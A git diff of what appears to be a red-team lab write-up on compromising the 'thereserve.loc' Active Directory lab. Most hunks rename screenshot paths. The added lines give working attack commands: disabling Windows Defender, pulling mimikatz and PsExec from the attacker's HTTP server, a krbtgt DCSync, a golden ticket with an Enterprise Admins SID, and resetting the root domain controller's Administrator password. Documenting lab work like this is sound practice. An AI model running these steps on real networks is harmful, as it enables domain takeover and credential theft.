@@ -18,7 +18,7 @@ ssh e-citizen@X.X.X.250
 Password: stabilitythroughcurrency
 ```
 
-<figure><img src="../../.gitbook/assets/image (84) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (84) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -43,7 +43,7 @@ No other ports found.
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $WEB
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2) (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Web - HTTP port 80
 
@@ -55,7 +55,7 @@ This ran for the majority of the time I was working on the box, I found the word
 dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (81) (2).png" alt=""><figcaption></figcaption></figure>
 
 Looking for php files we found the info file which can be used to find info about the server.
 
@@ -149,7 +149,7 @@ Nothing found
 dirb http://$WebMail:80 /usr/share/wordlists/dirb/big.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Evolution
 
@@ -397,7 +397,7 @@ ip a
 nmap -sP 12.100.1.1-255
 ```
 
-<figure><img src="../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (85) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Reverse shell
 
@@ -765,7 +765,7 @@ nmap -sV -sT -O -p 1-65535 10.200.89.21
 proxychains remmina 
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## 10.200.89.22
 
@@ -1461,9 +1461,12 @@ wget http://$KALI:81/mimikatz.exe
 sudo python2 -m SimpleHTTPServer 81
 ```
 
+Turn off Windows Defender to download mimikatz
+
 **Victim(CORPDC)**
 
 ```
+Set-MpPreference -DisableRealtimeMonitoring $true
 wget http://10.200.89.12:81/mimikatz.exe -O mimikatz.exe
 .\mimikatz
 ```
@@ -1473,7 +1476,6 @@ wget http://10.200.89.12:81/mimikatz.exe -O mimikatz.exe
 ```
 privilege::debug
 lsadump::dcsync /user:corp\krbtgt
-
 ```
 
 **Output**
@@ -1492,12 +1494,76 @@ Get SID of the domain
 Get-ADComputer -Identity "CORPDC"
 ```
 
-Get SID of the Admininstrator account
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Get SID of the Administrator account
 
 **Victim(Powershell)**
 
 ```
-  Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
+Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
+```
+
+<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mimikatz)**
+
+```
+kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
+```
+
+We now have access to the rootdc
+
+**Victim(Powershell)**
+
+```
+dir \\rootdc.thereserve.loc\c$
+```
+
+<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+
+### Download Psexec
+
+Link: [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
+
+**Kali**
+
+```
+unzip PSTools.zip
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(VPN)**
+
+```
+wget http://$KALI:81/PsExec64.exe
+sudo python2 -m SimpleHTTPServer 81
+```
+
+Turn off Windows Defender to download mimikatz
+
+**Victim(CORPDC)**
+
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+wget http://10.200.89.12:81/PsExec64.exe -O PsExec64.exe
+.\PsExec64.exe \\rootdc.thereserve.loc cmd.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+
+**RootDC**
+
+```
+net user Administrator pass123!
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+powershell
+wget http://10.200.89.12:81/mimikatz.exe -O mimikatz.exe
+
+```
+
+```
+n
 ```
 
 ## 10.200.89.201
